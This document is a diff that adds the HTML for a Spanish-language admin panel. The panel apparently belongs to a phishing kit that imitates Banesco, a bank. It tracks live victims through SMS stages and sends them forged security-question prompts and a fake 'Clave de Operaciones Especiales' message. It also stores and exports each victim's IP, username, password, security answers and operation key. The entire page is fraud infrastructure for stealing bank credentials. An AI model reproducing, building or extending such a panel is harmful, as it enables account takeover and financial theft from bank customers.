@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous" />
+  <title>cPanel</title>
+  <link rel="stylesheet" href="styles/panel.css" />
+  <link rel="stylesheet" href="styles/custom.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+</head>
+<body>
+  <!-- Pantalla de Login -->
+  <div id="login-screen" class="login-container">
+    <div class="card">
+      <div class="card-header">
+        <h3 class="mb-0">Panel</h3>
+      </div>
+      <div class="card-body">
+        <form id="login-form">
+          <div class="form-group">
+            <label for="username">Usuario</label>
+            <input type="text" class="form-control" id="username" placeholder="Ingrese su usuario" />
+          </div>
+          <div class="form-group">
+            <label for="password">Contraseña</label>
+            <div class="input-group">
+              <input type="password" class="form-control" id="password" placeholder="Ingrese su contraseña" />
+              <div class="input-group-append">
+                <button class="btn btn-outline-secondary" type="button" id="toggle-password">
+                  <i class="fa fa-eye" id="eye-icon"></i>
+                </button>
+              </div>
+            </div>
+          </div>
+          <button type="submit" class="btn btn-primary btn-block">
+            Iniciar Sesión
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+  <!-- Panel de Administración -->
+  <div id="admin-panel" class="d-none">
+    <nav class="navbar navbar-dark mb-4">
+      <span class="navbar-brand">cPanel</span>
+      <div>
+        <button id="logout-btn" class="btn btn-outline-light">
+          Cerrar Sesión
+        </button>
+      </div>
+    </nav>
+    <div class="container-fluid">
+      <div class="row mb-4">
+        <div class="col-md-4">
+          <div class="counter-card blue">
+            <h5>Usuarios Activos</h5>
+            <h3 id="active-users-count">0</h3>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="counter-card green">
+            <h5>En SMS1</h5>
+            <h3 id="coordinates-users-count">0</h3>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="counter-card orange">
+            <h5>En SMS2</h5>
+            <h3 id="token-users-count">0</h3>
+          </div>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-md-12">
+          <div class="card mb-4">
+            <div class="card-header">
+              <h4 class="mb-0">Usuarios Activos</h4>
+            </div>
+            <div class="card-body">
+              <div id="no-users-message" class="alert alert-info d-none">
+                No hay usuarios activos en este momento.
+              </div>
+              <div id="users-list" class="row">
+                <!-- Aquí se cargarán los usuarios activos -->
+              </div>
+            </div>
+          </div>
+          <div class="d-flex col-12">
+            <div class="card col-6">
+              <div class="card-header">
+                <h4 class="mb-0">Palabras claves</h4>
+              </div>
+              <div class="card-body">
+                <form id="coordinates-form">
+                  <div class="form-group">
+                    <label for="coord-user-select">Seleccionar Usuario:</label>
+                    <select class="form-control" id="coord-user-select">
+                      <option value="">Seleccione un usuario...</option>
+                    </select>
+                  </div>
+                  <div class="form-group">
+                    <label for="pregunta1">Pregunta de Seguridad 1:</label>
+                    <input type="text" class="form-control" id="pregunta1" placeholder="Ej: ¿En qué ciudad naciste?" required />
+                  </div>
+                  <div class="form-group">
+                    <label for="pregunta2">Pregunta de Seguridad 2 (Opcional):</label>
+                    <input type="text" class="form-control" id="pregunta2" placeholder="Ej: ¿Cuál es el nombre de tu primera mascota? (Dejar vacío si no se desea)" />
+                  </div>
+                  <button type="submit" class="btn btn-primary btn-block">
+                    Configurar Preguntas y Redirigir
+                  </button>
+                </form>
+              </div>
+            </div>
+            <!-- Control de Mensaje COE -->
+            <div class="card col-6">
+              <div class="card-header">
+                <h4 class="mb-0">📱 Mensaje COE Empresas</h4>
+              </div>
+              <div class="card-body">
+                <form id="coe-message-form">
+                  <div class="form-group">
+                    <label for="coe-user-select">Seleccionar Usuario:</label>
+                    <select class="form-control" id="coe-user-select">
+                      <option value="">Seleccione un usuario...</option>
+                    </select>
+                  </div>
+                  <div class="form-group">
+                    <label for="phone-number">Número de Teléfono: <span class="text-danger">*</span></label>
+                    <input type="text" class="form-control" id="phone-number" placeholder="*******" maxlength="10" required />
+                  </div>
+                  <div class="form-group">
+                    <label for="custom-message">Mensaje Personalizado: <small class="text-muted">(Opcional)</small></label>
+                    <textarea class="form-control" id="custom-message" rows="3" placeholder="Consulte en su teléfono {phone} el mensaje de Banesco con la Clave de Operaciones Especiales que necesita para completar la autenticación."></textarea>
+                  </div>
+                  <div class="form-group">
+                    <small class="form-text text-muted">
+                      Variable disponible: {phone} = número de teléfono
+                    </small>
+                  </div>
+                  <button type="submit" class="btn btn-success btn-block">
+                    Actualizar Mensaje COE
+                  </button>
+                </form>
+              </div>
+            </div>
+          </div>
+
+          <!-- Control de Audio para Nuevas Cards -->
+          <div class="card mt-4">
+            <div class="card-header d-flex justify-content-between align-items-center">
+              <h4 class="mb-0">🔊 Configuración de Audio</h4>
+              <button class="btn btn-outline-primary btn-sm" onclick="toggleAudioPanel()" 
+                      style="transition: all 0.3s ease; border-radius: 20px;" 
+                      title="Mostrar/Ocultar configuración de audio">
+                <i class="fas fa-volume-up"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>
+              </button>
+            </div>
+            <div class="card-body" id="audio-panel-section">
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="form-group">
+                    <div class="custom-control custom-switch">
+                      <input type="checkbox" class="custom-control-input" id="audio-enabled" checked>
+                      <label class="custom-control-label" for="audio-enabled">
+                        <strong>Activar sonido para nuevas cards</strong>
+                      </label>
+                    </div>
+                    <small class="form-text text-muted">Reproduce un sonido cuando aparece un nuevo usuario</small>
+                  </div>
+                  
+                  <div class="form-group">
+                    <label for="audio-volume">Volumen:</label>
+                    <div class="d-flex align-items-center">
+                      <input type="range" class="custom-range flex-grow-1" id="audio-volume" min="0" max="100" value="70">
+                      <span class="ml-2" id="volume-display">70%</span>
+                    </div>
+                  </div>
+                </div>
+                
+                <div class="col-md-6">
+                  <div class="form-group">
+                    <label for="audio-sound-select">Sonido nuevas cards:</label>
+                    <select class="form-control" id="audio-sound-select">
+                      <option value="/sounds/franklin-notification-gta-v.mp3">Franklin Notification (GTA V)</option>
+                      <option value="/sounds/billete-papa.mp3">Billete Papa</option>
+                    </select>
+                  </div>
+                  
+                  <div class="form-group">
+                    <label for="audio-update-select">Sonido actualizaciones:</label>
+                    <select class="form-control" id="audio-update-select">
+                      <option value="/sounds/billete-papa.mp3">Billete Papa</option>
+                      <option value="/sounds/franklin-notification-gta-v.mp3">Franklin Notification (GTA V)</option>
+                    </select>
+                  </div>
+                  
+                  <div class="form-group">
+                    <button type="button" class="btn btn-info btn-sm" id="test-audio-btn">
+                      🎵 Probar Nueva Card
+                    </button>
+                    <button type="button" class="btn btn-warning btn-sm ml-1" id="test-update-btn">
+                      🔄 Probar Actualización
+                    </button>
+                    <button type="button" class="btn btn-success btn-sm ml-2" id="save-audio-config">
+                      💾 Guardar
+                    </button>
+                  </div>
+                  
+                  <div class="form-group">
+                    <small class="text-muted">
+                      <strong>Última nueva card:</strong> <span id="last-new-user">Ninguna</span><br>
+                      <strong>Total nuevas cards:</strong> <span id="notification-count">0</span><br>
+                      <strong>Última actualización:</strong> <span id="last-updated-user">Ninguna</span><br>
+                      <strong>Total actualizaciones:</strong> <span id="update-count">0</span>
+                    </small>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Nueva sección de Historial de Datos -->
+          <div class="card mt-4">
+            <div class="card-header d-flex justify-content-between align-items-center">
+              <h4 class="mb-0">📊 Historial de Datos</h4>
+              <button class="btn btn-outline-primary btn-sm" onclick="toggleHistorial()">
+                <i class="fas fa-chart-bar"></i> Ver/Ocultar
+              </button>
+            </div>
+            <div class="card-body" id="historial-section" style="display: none;">
+
+              <!-- Controles de filtrado -->
+              <div class="row mb-3">
+                <div class="col-md-3">
+                  <label for="fechaInicio">Fecha Inicio:</label>
+                  <input type="date" class="form-control form-control-sm" id="fechaInicio">
+                </div>
+                <div class="col-md-3">
+                  <label for="fechaFin">Fecha Fin:</label>
+                  <input type="date" class="form-control form-control-sm" id="fechaFin">
+                </div>
+                <div class="col-md-3">
+                  <label for="filtroUsuario">Usuario:</label>
+                  <input type="text" class="form-control form-control-sm" id="filtroUsuario" placeholder="Buscar usuario...">
+                </div>
+                <div class="col-md-3">
+                  <label for="filtroColor">Color:</label>
+                  <select class="form-control form-control-sm" id="filtroColor">
+                    <option value="">Todos</option>
+                    <option value="#dc3545">Rojo</option>
+                    <option value="#007bff">Azul</option>
+                    <option value="#28a745">Verde</option>
+                    <option value="#ffc107">Amarillo</option>
+                    <option value="#6f42c1">Morado</option>
+                    <option value="#fd7e14">Naranja</option>
+                  </select>
+                </div>
+              </div>
+
+              <!-- Botones de acción -->
+              <div class="row mb-3">
+                <div class="col-md-8">
+                  <button class="btn btn-primary btn-sm mr-2" onclick="cargarHistorial()">
+                    <i class="fas fa-sync"></i> Actualizar
+                  </button>
+                  <button class="btn btn-info btn-sm mr-2" onclick="aplicarFiltrosHistorial()">
+                    <i class="fas fa-filter"></i> Filtrar
+                  </button>
+                  <button class="btn btn-success btn-sm mr-2" onclick="exportarHistorialCSV()">
+                    <i class="fas fa-file-csv"></i> CSV
+                  </button>
+                  <button class="btn btn-success btn-sm mr-2" onclick="exportarHistorialJSON()">
+                    <i class="fas fa-file-code"></i> JSON
+                  </button>
+                  <button class="btn btn-secondary btn-sm" onclick="limpiarFiltrosHistorial()">
+                    <i class="fas fa-eraser"></i> Limpiar
+                  </button>
+                </div>
+                <div class="col-md-4 text-right">
+                  <button class="btn btn-warning btn-sm mr-2" onclick="eliminarRegistrosAntiguos()">
+                    <i class="fas fa-calendar-times"></i> Eliminar Antiguos (90d)
+                  </button>
+                  <button class="btn btn-danger btn-sm" onclick="confirmarEliminacionTotal()">
+                    <i class="fas fa-trash-alt"></i> Eliminar Todos
+                  </button>
+                </div>
+              </div>
+
+              <!-- Estadísticas -->
+              <div class="row mb-3" id="estadisticas-historial">
+                <div class="col-md-3">
+                  <div class="card bg-primary text-white">
+                    <div class="card-body text-center">
+                      <h5 id="total-registros">0</h5>
+                      <small>Total Registros</small>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-3">
+                  <div class="card bg-info text-white">
+                    <div class="card-body text-center">
+                      <h5 id="colores-unicos">0</h5>
+                      <small>Colores Únicos</small>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-3">
+                  <div class="card bg-success text-white">
+                    <div class="card-body text-center">
+                      <h5 id="dias-actividad">0</h5>
+                      <small>Días con Actividad</small>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-3">
+                  <div class="card bg-warning text-white">
+                    <div class="card-body text-center">
+                      <h5 id="ultimo-acceso">N/A</h5>
+                      <small>Último Acceso</small>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Loading -->
+              <div id="loading-historial" class="text-center" style="display: none;">
+                <div class="spinner-border text-primary" role="status">
+                  <span class="sr-only">Cargando...</span>
+                </div>
+                <p class="mt-2">Cargando datos del historial...</p>
+              </div>
+
+              <!-- Tabla de datos -->
+              <div class="table-responsive">
+                <table class="table table-striped table-sm" id="tabla-historial" style="display: none;">
+                  <thead class="thead-dark">
+                    <tr>
+                      <th>IP</th>
+                      <th>Tipo</th>
+                      <th>Usuario</th>
+                      <th>Clave</th>
+                      <th>Preg. Seg. 1</th>
+                      <th>Preg. Seg. 2</th>
+                      <th>Clave Op. Esp.</th>
+                    </tr>
+                  </thead>
+                  <tbody id="tbody-historial">
+                    <!-- Los datos se cargarán aquí -->
+                  </tbody>
+                </table>
+              </div>
+
+              <!-- Mensaje sin datos -->
+              <div id="no-data-historial" class="alert alert-info text-center" style="display: none;">
+                <i class="fas fa-inbox"></i>
+                <h5>No hay datos disponibles</h5>
+                <p>No se encontraron registros con los filtros aplicados.</p>
+              </div>
+
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal de confirmación para eliminación total -->
+  <div class="modal fade" id="modalEliminacionTotal" tabindex="-1" role="dialog" aria-labelledby="modalEliminacionTotalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+      <div class="modal-content">
+        <div class="modal-header bg-danger text-white">
+          <h5 class="modal-title" id="modalEliminacionTotalLabel">
+            <i class="fas fa-exclamation-triangle"></i> ⚠️ Confirmación de Eliminación Total
+          </h5>
+          <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body">
+          <div class="alert alert-danger">
+            <h6><strong>¡ATENCIÓN! Esta acción es IRREVERSIBLE</strong></h6>
+            <p class="mb-2">Estás a punto de eliminar <strong>TODOS</strong> los registros del historial de datos.</p>
+            <ul class="mb-0">
+              <li>Se eliminarán <strong id="total-registros-modal">0</strong> registros</li>
+              <li>Esta acción <strong>NO se puede deshacer</strong></li>
+              <li>Se liberará espacio en Firestore</li>
+              <li>Se perderá todo el historial de usuarios</li>
+            </ul>
+          </div>
+
+          <div class="form-group">
+            <label for="confirmacionTexto">Para confirmar, escribe <strong>"ELIMINAR TODO"</strong>:</label>
+            <input type="text" class="form-control" id="confirmacionTexto" placeholder="Escribe: ELIMINAR TODO">
+          </div>
+
+          <div class="form-check">
+            <input class="form-check-input" type="checkbox" id="confirmacionCheckbox">
+            <label class="form-check-label" for="confirmacionCheckbox">
+              Entiendo que esta acción es irreversible y eliminará todos los datos
+            </label>
+          </div>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">
+            <i class="fas fa-times"></i> Cancelar
+          </button>
+          <button type="button" class="btn btn-danger" id="btnConfirmarEliminacion" disabled onclick="eliminarTodosLosRegistros()">
+            <i class="fas fa-trash-alt"></i> Eliminar Todos los Registros
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal de progreso -->
+  <div class="modal fade" id="modalProgreso" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title">
+            <i class="fas fa-cog fa-spin"></i> Eliminando Registros...
+          </h5>
+        </div>
+        <div class="modal-body text-center">
+          <div class="progress mb-3">
+            <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar"
+                 style="width: 0%" id="barraProgreso"></div>
+          </div>
+          <p id="textoProgreso">Preparando eliminación...</p>
+          <small class="text-muted" id="detalleProgreso">Esto puede tomar varios minutos</small>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+  <!-- Incluir directamente la configuración para el panel admin -->
+ 
+  <!-- El panel.js se carga como módulo al final del body -->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
+  <script type="module" src="js/panel.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const togglePassword = document.getElementById('toggle-password');
+      const password = document.getElementById('password');
+      const eyeIcon = document.getElementById('eye-icon');
+      
+      if (togglePassword && password && eyeIcon) {
+        togglePassword.addEventListener('click', function() {
+          // Cambiar el tipo de input
+          const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+          password.setAttribute('type', type);
+          
+          // Cambiar el icono
+          if (type === 'password') {
+            eyeIcon.setAttribute('class', 'fa fa-eye');
+          } else {
+            eyeIcon.setAttribute('class', 'fa fa-eye-slash');
+          }
+          
+          // Evita que el botón envíe el formulario
+          return false;
+        });
+      }
+    });
+  </script>
+</body>
+</html>
